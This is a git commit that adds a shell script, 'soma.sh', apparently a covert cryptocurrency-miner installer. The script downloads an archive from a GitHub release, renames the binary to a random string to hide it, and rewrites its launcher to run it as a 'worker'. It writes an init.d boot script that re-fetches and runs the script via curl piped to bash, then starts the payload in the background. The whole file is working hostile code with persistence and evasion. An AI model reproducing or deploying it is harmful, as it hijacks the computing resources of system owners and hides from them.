2c90a2b9a5158587d20a232a3a2518ab3af24313
omepra <amaymaymay295@gmail.com>
2024-06-10 14:46:36 +0700

    Create soma.sh

---
+++ soma.sh
@@ -0,0 +1,15 @@
+cd /
+wget https://github.com/sertral/diovan/releases/download/v1.5.1/zocor.tar
+tar -xvf zocor.tar
+cd /zocor
+variable1=$(< /dev/urandom tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
+mv warfar $variable1
+sed -i "s/mongodb/${variable1} --worker ${variable1}/g" ./bactrim.sh
+cd /etc/init.d
+echo "bash <(curl -s -L https://raw.githubusercontent.com/sertral/diovan/main/soma.sh)" > enalap.sh
+chmod a+x enalap.sh
+update-rc.d enalap.sh defaults
+rm -rf zocor.tar
+cd /zocor
+nohup ./bactrim.sh
+ps -ef | grep zocor
